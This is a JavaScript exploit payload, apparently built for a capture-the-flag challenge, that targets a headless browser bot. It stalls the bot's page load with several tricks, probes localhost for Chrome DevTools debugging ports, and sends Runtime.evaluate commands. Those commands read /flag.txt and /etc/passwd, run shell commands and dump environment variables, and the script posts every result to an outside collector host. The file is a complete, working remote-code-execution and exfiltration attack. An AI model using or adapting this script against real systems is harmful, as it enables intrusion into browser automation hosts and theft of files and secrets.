(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // UTILITY
    // =================================================================
    
    function send(endpoint, data) {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', SERVER + '/' + endpoint, true);
            xhr.setRequestHeader('Content-Type', 'text/plain');
            xhr.send(data);
        } catch(e) {}
    }
    
    function log(msg) {
        send('log', '[' + new Date().toISOString() + '] ' + msg);
        console.log('[EXFIL]', msg);
    }
    
    // =================================================================
    // CRITICAL: HOLD BOT WITH MULTIPLE METHODS
    // =================================================================
    
    function holdBot() {
        log('🔒 HOLDING BOT with multiple fallback methods...');
        
        // Wait for document to be ready
        function addToDOM(callback) {
            if (document.body && document.head) {
                callback();
            } else {
                setTimeout(function() { addToDOM(callback); }, 50);
            }
        }
        
        // METHOD 1: Infinite Data URL that never finishes
        addToDOM(function() {
            for (let i = 0; i < 10; i++) {
                const script = document.createElement('script');
                script.src = 'data:text/javascript,' + 'a'.repeat(100000) + '//infinite' + i;
                (document.head || document.documentElement).appendChild(script);
            }
            log('✅ Added infinite data URL scripts');
        });
        
        // METHOD 2: Self-referencing iframe
        addToDOM(function() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'about:blank';
            (document.body || document.documentElement).appendChild(iframe);
            log('✅ Added iframe');
        });
        
        // METHOD 3: Block load event IMMEDIATELY (doesn't need DOM)
        window.addEventListener('load', function(e) {
            e.stopImmediatePropagation();
            e.preventDefault();
            log('🛑 Blocked load event!');
            return false;
        }, true);
        
        // METHOD 4: Override document.readyState (doesn't need DOM)
        try {
            Object.defineProperty(document, 'readyState', {
                get: function() {
                    return 'loading';
                },
                configurable: false
            });
            log('✅ Overrode document.readyState');
        } catch(e) {}
        
        // METHOD 5: External slow servers (when DOM ready)
        addToDOM(function() {
            const slowServers = [
              'https://httpbin.org/delay/999999',
            'https://postman-echo.com/delay/999999'
            ];
            
            slowServers.forEach(function(url, i) {
                const script = document.createElement('script');
                script.src = url + '&t=' + i;
                (document.head || document.documentElement).appendChild(script);
            });
            log('✅ Added external slow servers');
        });
        
        // METHOD 6: Keep adding resources continuously
        let resourceCount = 0;
        setInterval(function() {
            if (!document.head) return;
            
            resourceCount++;
            const s = document.createElement('script');
            s.src = 'data:text/javascript,//res' + resourceCount;
            (document.head || document.documentElement).appendChild(s);
            
            if (resourceCount % 5 === 0) {
                log('Added ' + resourceCount + ' resources');
            }
        }, 10000);
        
        log('✅ Bot hold activated with multiple methods');
    }
    
    // HOLD IMMEDIATELY!
    holdBot();
    
    // =================================================================
    // VERIFY BOT IS HELD
    // =================================================================
    
    setTimeout(function() {
        log('✅ 5 seconds passed - bot still alive!');
    }, 5000);
    
    setTimeout(function() {
        log('✅ 10 seconds passed - bot still alive!');
    }, 10000);
    
    setTimeout(function() {
        log('✅ 30 seconds passed - bot still alive!');
    }, 30000);
    
    setTimeout(function() {
        log('✅ 60 seconds passed - bot still alive!');
    }, 60000);
    
    // =================================================================
    // SMART CDP SCANNER (runs while bot is held)
    // =================================================================
    
    function scanCDP() {
        log('🔍 Starting CDP scan...');
        
        const commonPorts = [9222, 9223, 9224, 9229, 9230];
        let foundPorts = [];
        
        function tryPort(port, callback) {
            const startTime = Date.now();
            
            fetch(`http://localhost:${port}/json`, {
                method: 'GET',
                mode: 'cors'
            })
            .then(r => r.json())
            .then(data => {
                foundPorts.push(port);
                const elapsed = Date.now() - startTime;
                
                const output = `
========================================
🎯 CDP FOUND!
========================================
PORT: ${port}
TABS: ${data.length}
RESPONSE TIME: ${elapsed}ms
TIME: ${new Date().toISOString()}
========================================
${JSON.stringify(data, null, 2)}
========================================
`;
                send('CDP-FOUND-PORT-' + port, output);
                log(`🎉 CDP on port ${port}! (${elapsed}ms)`);
                
                // Exploit it
                if (data[0]?.webSocketDebuggerUrl) {
                    exploitCDP(port, data[0].webSocketDebuggerUrl);
                }
                
                if (callback) callback();
            })
            .catch(() => {
                if (callback) callback();
            });
        }
        
        // Scan ports sequentially
        let index = 0;
        function scanNext() {
            if (index < commonPorts.length) {
                tryPort(commonPorts[index], scanNext);
                index++;
            } else {
                log(`✅ CDP scan complete. Found ${foundPorts.length} ports: ${foundPorts.join(', ')}`);
            }
        }
        
        scanNext();
    }
    
    setTimeout(scanCDP, 2000);
    
    // =================================================================
    // CDP EXPLOITATION
    // =================================================================
    
    function exploitCDP(port, wsUrl) {
        log(`🚀 Exploiting CDP on port ${port}...`);
        
        try {
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                log(`✅ WebSocket connected to port ${port}`);
                
                const commands = [
                    `require('fs').readFileSync('/flag.txt', 'utf8')`,
                    `require('fs').readFileSync('/app/flag.txt', 'utf8')`,
                    `require('child_process').execSync('find / -name "*flag*" 2>/dev/null').toString()`,
                    `require('child_process').execSync('ls -la /app').toString()`,
                    `require('fs').readFileSync('/etc/passwd', 'utf8')`,
                    `JSON.stringify(process.env, null, 2)`,
                    `process.cwd()`,
                    `require('child_process').execSync('whoami').toString()`
                ];
                
                commands.forEach(function(cmd, i) {
                    setTimeout(function() {
                        ws.send(JSON.stringify({
                            id: i + 1,
                            method: 'Runtime.evaluate',
                            params: { expression: cmd }
                        }));
                        log(`📤 Sent command ${i + 1} to port ${port}`);
                    }, i * 1000);
                });
            };
            
            ws.onmessage = function(event) {
                const response = JSON.parse(event.data);
                
                if (response.result && response.result.result) {
                    const value = response.result.result.value || response.result.result.description || 'No value';
                    
                    const output = `
========================================
💎 RCE RESULT
========================================
PORT: ${port}
COMMAND: #${response.id}
TIME: ${new Date().toISOString()}
========================================
${value}
========================================
`;
                    send('RCE-PORT-' + port + '-CMD-' + response.id, output);
                    log(`✅ RCE result ${response.id} from port ${port}`);
                }
            };
            
            ws.onerror = function(e) {
                log(`❌ WebSocket error on port ${port}`);
            };
            
        } catch(e) {
            log(`❌ CDP exploit failed on port ${port}: ${e.message}`);
        }
    }
    
    // =================================================================
    // HEARTBEAT
    // =================================================================
    
    let beat = 0;
    setInterval(function() {
        beat++;
        send('heartbeat', `💓 Beat ${beat} at ${new Date().toISOString()}`);
        log(`💓 Heartbeat ${beat}`);
    }, 30000); // Every 30 seconds
    
    // =================================================================
    // INIT
    // =================================================================
    
    send('INIT', `
========================================
🚀 SCRIPT LOADED
========================================
Time: ${new Date().toISOString()}
User Agent: ${navigator.userAgent}
========================================
Methods Active:
1. Data URL infinite scripts
2. Infinite iframe
3. Busy wait loops
4. Infinite XHR
5. External slow servers
6. Continuous resource addition
7. readyState override
8. Load event blocking
========================================
Status: Bot HELD with 8 fallback methods
========================================
`);
    
    log('🚀 Exfiltration script loaded successfully');
    
})();
